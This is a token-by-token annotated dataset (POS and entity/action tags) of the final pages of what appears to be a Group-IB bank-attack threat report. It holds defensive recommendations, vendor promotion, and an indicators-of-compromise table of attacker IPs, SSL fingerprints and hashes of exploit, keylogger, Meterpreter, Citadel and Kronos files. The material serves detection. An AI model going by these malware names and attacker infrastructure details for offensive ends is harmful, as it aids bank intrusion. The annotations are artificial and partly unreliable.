administrative JJ O O
rights NNS O O
. . O O

30 CD O O
• NN O O
Isolate JJ O O
hosts NNS O O
in IN O O
the DT O O
same JJ O O
VLAN NNP O O
, , O O
so IN O O
that DT O O
one CD O O
workstation NN O O
would MD O O
not RB O O
be VB O O
able JJ O O
to TO O O
gain VB O O
access NN O O
to TO O O
another DT O O
one NN O O
on IN O O
network NN O O
levels NNS O O
L2/L3 NNP O O
, , O O
and CC O O
could MD O O
access NN B-Entity 1
shared VBN I-Entity O
network NN I-Entity O
segments NNS I-Entity O
( ( I-Entity O
printers NNS I-Entity O
, , I-Entity O
servers NNS I-Entity O
, , I-Entity O
etc FW I-Entity O
. . I-Entity O
) ) I-Entity O
. . O O

• JJ O O
Provide NNP O O
timely RB O O
updates VBZ O O
of IN O O
OS NNP O O
, , O O
antivirus NN O O
software NN O O
and CC O O
other JJ O O
applications NNS O O
. . O O

• JJ O O
Configure NNP O O
the DT O O
service NN O O
accounts NNS O O
with IN O O
the DT O O
minimum JJ O O
set NN O O
of IN O O
permissions NNS O O
necessary JJ O O
for IN O O
them PRP O O
to TO O O
function VB O O
properly RB O O
( ( O O
with IN O O
respect NN O O
to TO O O
logon VB B-Action 1
type NN B-Entity 2
and CC I-Entity O
group NN I-Entity O
membership NN I-Entity O
) ) I-Entity O
. . O O

Strictly RB O O
prohibit NN O O
adding VBG O O
service NN O O
accounts NNS O O
to TO O O
the DT O O
local JJ O O
administrators NNS O O
group NN O O
unless IN O O
absolutely RB O O
necessary JJ O O
. . O O

• NN O O
Use NNP O O
IDS NNP O O
solutions NNS O O
and CC O O
a DT O O
sandbox NN O O
to TO O O
analyze VB O O
files NNS O O
. . O O

We PRP O O
recommend VB O O
that IN O O
companies NNS B-Entity 1
apply VBP I-Entity O
technology NN I-Entity O
like IN I-Entity O
Group- NNP I-Entity O
IB NNP I-Entity O
’ NNP I-Entity O
s VBD I-Entity O
TDS NNP I-Entity O
Sensor NNP I-Entity O
and CC I-Entity O
sandbox NN I-Entity O
, , O O
which WDT O O
are VBP O O
able JJ O O
to TO O O
detect VB O O
and CC O O
prevent NN O O
these DT O O
types NNS O O
of IN O O
attacks NNS O O
. . O O

Measures NNS O O
to TO O O
protect VB O O
interbank NN O O
transfer NN O O
system NN O O
, , O O
card NN O O
processing NN O O
and CC O O
ATMs NNP O O
• NN O O
Isolate NNP O O
hosts NNS O O
of IN O O
workstations NNS O O
and CC O O
servers NNS O O
related VBN O O
to TO O O
the DT O O
interbank NN O O
transfer NN O O
system NN O O
. . O O

• JJ O O
Ensure NNP O O
the DT O O
integrity NN O O
of IN O O
data NNS O O
, , O O
system NN O O
and CC O O
application NN O O
software NN O O
deployed VBN O O
on IN O O
the DT O O
infrastructure NN O O
servers VBZ O O
; : O O
introduce VB O O
application NN O O
whitelisting VBG O O
on IN O O
workstations NNS O O
. . O O

• JJ O O
Ensure NNP O O
monitoring NN O O
and CC O O
notifications NNS O O
in IN O O
case NN O O
of IN O O
anomalous JJ O O
time NN O O
of IN O O
access NN O O
to TO O O
servers NNS O O
and CC O O
workstations NNS O O
by IN O O
operators NNS O O
of IN O O
financial JJ O O
systems NNS O O
. . O O

• JJ O O
Ensure NNP O O
monitoring NN O O
and CC O O
notifications NNS O O
of IN O O
changes NNS O O
to TO O O
overdraft VB O O
and CC O O
cash NN O O
withdrawal NN O O
limits NNS O O
. . O O

31 CD O O
ABOUT RB O O
GROUP-IB NN O O
GROUP-IB NNP O O
HELPS NNP O O
MAJOR NNP O O
CORPORATIONS NNP O O
RECOGNIZE NNP O O
AND CC O O
REACT NNP O O
TO NNP O O
THE NNP O O
MOST NNP O O
SOPHISTICATED NNP O O
CYBER- NNP O O
THREATS NNP O O
. . O O

Profound NNP B-Entity 1
human NN I-Entity O
intelligence NN I-Entity O
and CC I-Entity O
cutting- NN I-Entity O
edge NN I-Entity O
technology NN I-Entity O
Group-IB JJ O O
leverages VBZ O O
its PRP$ O O
proprietary JJ O O
high-tech JJ O O
infrastructure NN O O
to TO O O
monitor VB B-Action 2
hacker NN B-Entity 3
activity NN I-Entity O
and CC I-Entity O
extract NN I-Entity O
unique JJ I-Entity O
data NNS I-Entity O
. . O O

These DT B-Entity 1
data NNS I-Entity O
is VBZ O O
accomplished JJ O O
by IN O O
profound JJ O O
human JJ O O
intelligence NN O O
by IN O O
experts NNS O O
who WP O O
conduct VBP O O
incident NN O O
response NN O O
and CC O O
monitor VB O O
the DT O O
most RBS O O
secretive JJ O O
underground JJ O O
hacker NN O O
forums NNS O O
. . O O

NETWORK NNP B-Entity 1
INFRASTRUCTURE NNP I-Entity O
• JJ I-Entity O
HoneyNet NNP I-Entity O
and CC I-Entity O
botnet NN I-Entity O
analysis NN I-Entity O
• JJ I-Entity O
Hacker NNP I-Entity O
community NN I-Entity O
infiltration NN I-Entity O
• JJ I-Entity O
Open-source NNP I-Entity O
monitoring NN I-Entity O
• NN I-Entity O
Network NNP I-Entity O
attack NN I-Entity O
trackers NNS I-Entity O
• JJ I-Entity O
TDS NNP I-Entity O
Sensors NNS I-Entity O
• JJ I-Entity O
Behavior NNP I-Entity O
analysis NN I-Entity O
system NN I-Entity O
Investigations NNS I-Entity O
HUMAN NNP I-Entity O
INTELLIGENCE NNP I-Entity O
• NN I-Entity O
Forensics NNS I-Entity O
• NN I-Entity O
• NNS I-Entity O
Malware NNP I-Entity O
monitoring NN I-Entity O
and CC I-Entity O
research NN I-Entity O
• JJ I-Entity O
CERT-GIB NNP I-Entity O
request NN I-Entity O
database NN I-Entity O
• JJ I-Entity O
Security NNP I-Entity O
assessment NN I-Entity O
• JJ O O
Group-IB NNP O O
case NN O O
studies NNS O O
GLOBAL NNP O O
DATA NNP O O
EXCHANGE NNP O O
• JJ O O
Computer NNP O O
incident NN O O
response NN O O
teams NNS O O
• NN O O
Domain NNP O O
registrar NN O O
and CC O O
hosting NN O O
providers NNS O O
• JJ O O
Cyber NNP O O
security NN O O
vendors NNS O O
• JJ O O
Cybersecurity NNP O O
associations NNS O O
& CC O O
professional JJ O O
organizations NNS O O
• NN O O
Europol NNP O O
, , O O
Interpol NNP O O
and CC O O
law NN O O
enforcement NN O O
agencies NNS O O
EUROPOL NN O O
INTERPOL NN O O
WORLD NN O O
ECONOMIC NN O O
FORUM NN O O
IDC NN O O
GARTNER NN O O
FORRESTER NN O O
Official JJ O O
ЕUROPOL NN O O
and CC O O
INTERPOL NNP O O
partner NN O O
Recommended VBN O O
by IN O O
the DT O O
Organization NN O O
for IN O O
Security NNP O O
and CC O O
Co-operation NN O O
in IN O O
Europe NNP O O
( ( O O
OSCE NNP O O
) ) O O
Member NNP O O
of IN O O
the DT O O
World NNP O O
Economic NNP O O
Forum NNP O O
Group-IB JJ O O
Threat NNP O O
Intelligence NNP O O
has VBZ O O
been VBN O O
recognized VBN O O
by IN O O
top JJ O O
industry NN O O
researcher NN O O
reports NNS O O
Products NNS O O
and CC O O
services NNS O O
powered VBN O O
by IN O O
Threat NN O O
Intelligence NN O O
Comprehensive NNP O O
ecosystem NN O O
of IN O O
threat NN O O
intelligence NN O O
and CC O O
security NN O O
solutions NNS O O
empowers NNS O O
organizations NNS O O
to TO O O
identify VB O O
threats NNS O O
sooner RB O O
, , O O
respond NN O O
faster RBR O O
, , O O
and CC O O
build VB O O
more RBR O O
effective JJ O O
defenses NNS O O
against IN O O
sophisticated JJ O O
cyberattacks NNS O O
. . O O

EARLY NNP B-Entity 1
WARNING NN I-Entity O
SYSTEM NNP I-Entity O
• JJ I-Entity O
Threat NNP I-Entity O
Intelligence NN I-Entity O
• NN I-Entity O
TDS NNP I-Entity O
• JJ I-Entity O
Secure NNP I-Entity O
Bank NNP I-Entity O
• JJ I-Entity O
Secure NNP I-Entity O
Portal NNP I-Entity O
PREVENTION NN I-Entity O
• JJ I-Entity O
Security NNP I-Entity O
audit NN I-Entity O
• JJ I-Entity O
Compromise NNP I-Entity O
Assessment NNP I-Entity O
• RB I-Entity O
Red NNP I-Entity O
Teaming NNP I-Entity O
• NNP I-Entity O
Brand NNP I-Entity O
Protection NNP I-Entity O
• NN I-Entity O
Antipiracy NN I-Entity O
RESPONSE $ I-Entity O
24/7/365 CD I-Entity O
• JJ I-Entity O
Computer NNP I-Entity O
Emergency NN I-Entity O
Response NNP I-Entity O
Team NN I-Entity O
CERT-GIB NN I-Entity O
RESPONSE $ I-Entity O
24/7/365 CD I-Entity O
• JJ I-Entity O
Digital NNP I-Entity O
forensics NNS I-Entity O
and CC I-Entity O
malware NN I-Entity O
analysis NN I-Entity O
Incident NNP I-Entity O
investigation NN I-Entity O
• NN I-Entity O
• JJ I-Entity O
Financial NNP I-Entity O
and CC I-Entity O
corporate JJ I-Entity O
Investigation NN I-Entity O
32 CD I-Entity O
12 CD I-Entity O
INDICATORS NNS I-Entity O
OF IN I-Entity O
COMPROMISE NNP I-Entity O
Malicious JJ I-Entity O
SSL NNP I-Entity O
certificates NNS I-Entity O
Issuer NN I-Entity O
SSL NNP I-Entity O
fingerprint NN I-Entity O
IP NNP I-Entity O
, , I-Entity O
where WRB I-Entity O
it PRP I-Entity O
was VBD I-Entity O
used VBN I-Entity O
MetaBank NNP I-Entity O
LTD NNP I-Entity O
8b7fa4ef88a303bb47240c9b8012c80507074f2e CD I-Entity O
Yahoo NNP I-Entity O
Inc NNP I-Entity O
. . I-Entity O
c29d79df9b5416fd416c31e57cd525dfc23a8f66 NN I-Entity O
83.220.172.71 CD I-Entity O
37.46.133.190 CD I-Entity O
172.86.121.11 CD I-Entity O
Fiserv NNP I-Entity O
Inc NNP I-Entity O
b3dd855fc1b32757bde5c9f737808f150d6f57e6 NN I-Entity O
146.185.243.19 CD I-Entity O
Microsoft NNP I-Entity O
Ltd NNP I-Entity O
98cbe44e1a30448a3ff6be38e8b277ae189f9b45 CD I-Entity O
82.146.54.5 CD I-Entity O
Federal NNP I-Entity O
Reserve NNP I-Entity O
Bank NNP I-Entity O
5fe7f5924ee2382dbfa5c8bdc6d04f0ff5d9273a CD I-Entity O
188.120.235.201 CD I-Entity O
Bank NNP I-Entity O
of IN I-Entity O
America NNP I-Entity O
5922a06f03f6464921462c07842afb18da1577e9 CD I-Entity O
188.120.230.218 CD I-Entity O
188.120.230.235 CD I-Entity O
VMware NN I-Entity O
7aa02d827609e0b6b3dca6d0ef82fe3a1fbe1d67 CD I-Entity O
185.141.25.222 CD I-Entity O
Privilege NNP I-Entity O
escalation NN I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
Description NN I-Entity O
ASLRSideChannelAttack NNP I-Entity O
. . O O

exe NN B-Entity 1
9a82aa5af19fa0a6167f87ee500856d53690c92c8c6449af54d8e5 CD I-Entity O
d33cf8bff4 NN I-Entity O
LPE NNP I-Entity O
Win10x64 NNP I-Entity O
cve.bat NN I-Entity O
cve.exe NN I-Entity O
7ff092853c15b51315414939c165ea9bce1f920d2d99e570d747ee7fc CD I-Entity O
9fa734a CD I-Entity O
BAT NNP I-Entity O
LPE NNP I-Entity O
executor NN I-Entity O
98b6f9172ca273deef324f032a8e992b6e6ca3c6542449a48246b3 CD I-Entity O
646b6c8cb6 CD I-Entity O
cve-2016-7255 NN I-Entity O
cve-2016-7255.exe NN I-Entity O
5ec6a6c9a7233a7ff68d989d830a2249e94a2784e69d5c8a593d3 CD I-Entity O
345da14a6b5 CD I-Entity O
cve-2016-7255 NN I-Entity O
cve-2016-7255test.exe NN I-Entity O
df69966d721193e2315723dd71636b93cc76b38cfa046dce45d7aec NN I-Entity O
4856f4bee CD I-Entity O
cve-2016-7255 NN I-Entity O
33 CD I-Entity O
Keylogger NNP I-Entity O
and CC I-Entity O
Sreenshotter NNP I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
perfmon.exe NN I-Entity O
2049df4a5f92709bad14a7e2b8c0cfcb6ede2f71009cb3483892108e949800e6 CD I-Entity O
perfmonpe.exe NN I-Entity O
ff3c84266fdba3638b9fc1a41cab87cf4021eb531954343d1a328b307b586ac6 NN I-Entity O
recycler.exe NN I-Entity O
206aec8132cbb2497553b1f2c1c40733188929bad2feb0640e99474b327e564b CD I-Entity O
Description NN I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/ NNP I-Entity O
Screenshotter NN I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/ NNP I-Entity O
Screenshotter NN I-Entity O
Dropper NNP I-Entity O
of IN I-Entity O
Keylogger/ NNP I-Entity O
Screenshotter NN I-Entity O
xkey.exe NN I-Entity O
b2e02579cf0e9c2a57bff806b57d6b868d5d411264d38ff7ac7e6b47d0d2a33d NN I-Entity O
Keylogger/ NNP I-Entity O
Screenshotter NNP I-Entity O
xkey_x86.dll NN I-Entity O
60e6652ae39ecd9314ba0e7936b41ca813737183c4eaa96dce0b4a36a90375dd CD I-Entity O
Keylogger/ NNP I-Entity O
Screenshotter NNP I-Entity O
hkcmd.exe NN I-Entity O
4672E624C5210A523AA0A0B56DB677B6 CD I-Entity O
Keylogger NNP I-Entity O
stores NNS I-Entity O
logs NNS I-Entity O
in IN I-Entity O
snmp.dat NN I-Entity O
Malware NNP I-Entity O
for IN I-Entity O
AWS NNP I-Entity O
CBR NNP I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
Description NN I-Entity O
main.exe NN I-Entity O
igfxserv.exe NN I-Entity O
xml.exe NN I-Entity O
ed.exe NN I-Entity O
77003E4E6EB091643DFF0C0F967D8C9001DE7D8689E493D67D0F4275 CD I-Entity O
CC189083 NN I-Entity O
Main NNP I-Entity O
module NN I-Entity O
5F6D1B1728EAE505B23C7FD16E04AD534D44465AFE4C3FD420475CAB2 CD I-Entity O
5B61B02 CD I-Entity O
Module NNP I-Entity O
which WDT O O
replaces VBZ O O
payment NN O O
data NNS O O
2B365805E50A09B0149FF2E706CB19D7FAC71FC6B1D1273BE8EB3E93875 CD O O
0C23B CD O O
Module NNP O O
which WDT O O
replaces VBZ O O
/ CD O O
hides NNS O O
fraud NN O O
transactions NNS O O
txt.exe NN O O
was VBD O O
not RB O O
restored VBN O O
Module NNP O O
which WDT O O
operates VBZ O O
with IN O O
temp NN B-Entity 2
files NNS I-Entity O
Meterpreter NN I-Entity O
File NN I-Entity O
name NN I-Entity O
test64.exe NN I-Entity O
test64.exe NN I-Entity O
SHA256 NN I-Entity O
187E4204036445E6A86DB015166F271C472F40CC7D0224B3995686856917D64C CD I-Entity O
642eae9a42c06265444577fc28165dab99efe3495eeae1be95b8608867f8276d CD I-Entity O
test32.exe NN I-Entity O
649fc133ddacc38fb7f2a730f261365e03b84de7f8ccd942573165ba5ff62728 CD I-Entity O
asys.exe NN I-Entity O
cmd.exe NN I-Entity O
6ce7c4cb9e51116a4565e9b2e129335a4d23cfc51a32080aa9f25689cb1c6ef2 CD I-Entity O
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f CD I-Entity O
launch-paranoid-stageless3 NN I-Entity O
. . O O

exe NN B-Entity 1
f98b0220a11b57e3c812e7f86f5e5c3f8bbdb5d5ce9dc7b721e28a7f28ecb1ef NN I-Entity O
mencstager.exe NN I-Entity O
7eef88e4b0d5ad549d18629f4491088d5d328d7bcaab8ce68216a331b284d43f CD I-Entity O
msc.exe NN I-Entity O
msc3.exe NN I-Entity O
0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff CD I-Entity O
0b778857bbc4ec36020d021f475ff90550134beb9506c53071652421e10ddfff CD I-Entity O
34 CD I-Entity O
msc4.exe NN I-Entity O
msc5.exe NN I-Entity O
msc6.exe NN I-Entity O
msc7.exe NN I-Entity O
53c789565821b6eb64bd7f002e38b8259bde3bbbb39798c82657b2b5d59bcd9f CD I-Entity O
98fb846df3687b3c9c7fa66f39d6c70948e8330489be7c787e1f2c3b23f8d205 CD I-Entity O
92afe22f494a849345b18d2b302e71a4336871a7956795a7188280e4c7bd8607 CD I-Entity O
73b8ed8f14ec2260ae332603f723a5eb0a52c4c997454904e3d5ff254a27a6e6 CD I-Entity O
puttyx.exe NN I-Entity O
e19e48ed659981c4d79c20f1ba9c2ab9af4fb94c67c71f64d0ea48be3ff9da97 NN I-Entity O
rc4.dll NN I-Entity O
rc4.exe NN I-Entity O
rc4.hta NN I-Entity O
8a0be0a97ba19d4498b58365d36ba5461039e41f73bbd745b15b80fc21e38c3f CD I-Entity O
a7035c20c32ad4cd1cc76b211f6258fc5858e4bc43031d04e3655b38b666c0c4 NN I-Entity O
72ee03b51544002df3e25d1a730e650389bdbd5f1cff91488ed9e05944b3cb52 CD I-Entity O
Meterpreter NNP I-Entity O
related VBD I-Entity O
scripts NNS I-Entity O
File NN I-Entity O
name NN I-Entity O
debug.vbs NN I-Entity O
drives.vbs NN I-Entity O
SHA256 NN I-Entity O
c8d4ba78c89bdb1af01100518db53bf88e0120c89ba7e346e7fcda4b56a07595 NN I-Entity O
f51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1 NN I-Entity O
gatherNetworksInfo.vbs NN I-Entity O
a3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d NN I-Entity O
link.vbs NN I-Entity O
link2.vbs NN I-Entity O
link3.vbs NN I-Entity O
link4.vbs NN I-Entity O
link5.vbs NN I-Entity O
link6.vbs NN I-Entity O
link7.vbs NN I-Entity O
lmagent.vbs NN I-Entity O
logon.vbs NN I-Entity O
701e99c1a84dd8e84b252512ff13b777a3f2135f7cdf3873086e021b19289681 CD I-Entity O
fffd31faa176cee8c41dac2542308c3e9e553f3d7a9ce9a6422b390ffb23e511 NN I-Entity O
2267bbf93860dd1c62da2308a3bd2a265c418af1a3257c8649f6495de6a3d392 CD I-Entity O
5f254208721c87c274ab26ce4c21765efe56cfa65ee67bfb60c783097839f169 CD I-Entity O
0f6bff21f72b017de70556f5f7507b470e182e7f4f5ee9d6a72f7aff0c957218 CD I-Entity O
a467d30dd3138b300a15b733a92482a9f545d217c6c7c89e5ea975eb021002f5 NN I-Entity O
e360066239e8c19d50b625c8b935fe7f026ade845470250bf6b6aa2cb3943af0 NN I-Entity O
7180d79351741e8d53143e538aa46a7cc528fbae1baf9d1f95f362ef5b8d95e2 CD I-Entity O
f51d42946cc7f17114a3acc0d9678f2fa5ee4527a877b6b8071df22c26cfe6c1 NN I-Entity O
msdefender.bat NN I-Entity O
8cfeb71eaaa3df217e15a449bc4656841b58a4737760d956b1c8e6039cff61e6 CD I-Entity O
OLD_winstart.vbs NN I-Entity O
5f5ae87472013f6ec2c6d261e6675aa7b143dcaf3f5e372a51feb61a34097efe CD I-Entity O
proxystager.bat NN I-Entity O
3a163bb0a8abe244815836a05fab48b640ec537bd76c92b7857db18657d2a774 CD I-Entity O
ps.bat NN I-Entity O
9e9149ae6092c4a5bd4cb36cf40ec660e3ee10e76834340bf1234186315ca808 CD I-Entity O
RAVBg64.vbs NN I-Entity O
a3da7fd3dd3c12f6b0f3ce7d96906e8fcdcc0817a546777a5b37b9b1d1ec954d NN I-Entity O
se.vbs NN I-Entity O
ff999c968bce81987cab47a02a3b176042489d82644d4c6fb13d5c8c1244cbcc NN I-Entity O
35 CD I-Entity O
Citadel NN I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
Description NN I-Entity O
c4c.exe NN I-Entity O
c7d20b726708a441db3d864457a097833654719513990f823b1deb7c48b65472 NN I-Entity O
Citadel NN I-Entity O
fce2857010e1.exe NN I-Entity O
b75d28deeaece776fc09dbc0cd351adab1ed80ef4245f7681d4a57e47fa83fb7 NN I-Entity O
Citadel NN I-Entity O
cbcs.exe NN I-Entity O
e01e9cdfff085393362e1e2e3ec8cae33c536053760e65c7617d5a0dfd005874 NN I-Entity O
Citadel NNP I-Entity O
Backconnect NNP I-Entity O
Server NNP I-Entity O
Kronos NNS I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
203.exe CD I-Entity O
536fc552cc24733f05f5a3be333c030fc848060da978b282d67d67a7c76c0d30 CD I-Entity O
ScanPOS NN I-Entity O
File NN I-Entity O
name NN I-Entity O
SHA256 NN I-Entity O
a8b05325.exe NN I-Entity O
093c81f0b234c2aa0363129fdaaaf57551f161915da3d23f43a792b5f3024c1e CD I-Entity O
IP NNP I-Entity O
Addresses NNS I-Entity O
IP NNP I-Entity O
Addresses NNS I-Entity O
46.45.171.174 CD I-Entity O
46.45.171.174 CD I-Entity O
188.120.235.201 CD I-Entity O
82.146.54.5 CD I-Entity O
82.146.54.5 CD I-Entity O
83.220.172.71 CD I-Entity O
37.46.133.190 CD I-Entity O
172.86.121.11 CD I-Entity O
146.185.243.19 CD I-Entity O
188.120.235.201 CD I-Entity O
188.120.230.218 CD I-Entity O
188.120.230.235 CD I-Entity O
185.141.25.222 CD I-Entity O
185.141.25.81 CD I-Entity O
185.86.149.140 CD I-Entity O
212.117.180.238 CD I-Entity O
155.94.238.15 CD I-Entity O
Malware NN I-Entity O
ScanPOS NN I-Entity O
Kronos NNS I-Entity O
Citadel NN O O
Citadel NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
Meterpreter NN O O
ISP NN O O
Sayfa JJ O O
Net NN O O
Sayfa JJ O O
Net NN O O
ISPsystem NN O O
ISPsystem NN O O
ISPsystem NN O O
ISPsystem NN O O
ISPsystem NN O O
Router NNP O O
Hosting NNP O O
Just RB O O
Hosting VBG O O
ISPsystem NN O O
ISPsystem NN O O
ISPsystem NN O O
HostSailor NN O O
HostSailor NN O O
Country NN O O
Turkey NN O O
Turkey NN O O
Russia NN O O
Russia NN O O
Russia NN O O
Russia NN O O
Russia NN O O
USA NNP O O
Russia NN O O
Russia NN O O
Russia NN O O
Russia NN O O
Romania NN O O
Romania NN O O
Virtual JJ O O
Server NNP O O
hosting NN O O
Latvia NN O O
root NN O O
S.A NNP O O
. . O O
Luxembourg NN O O
HostBrew NNP O O
, , O O
LLC NNP O O
USA NNP O O
36 CD O O
Preventing VBG O O
and CC O O
investigating VBG B-Action 2
cybercrime NN B-Entity 3
since IN I-Entity O
2003 CD I-Entity O
www.group-ib.com NN I-Entity O
blog.group-ib.com NN I-Entity O
info JJ I-Entity O
@ CD I-Entity O
group-ib.com NN I-Entity O
+44 $ I-Entity O
2036085907 CD I-Entity O
twitter.com/groupib_gib NN I-Entity O
linkedin.com/organization/1382013 NN I-Entity O

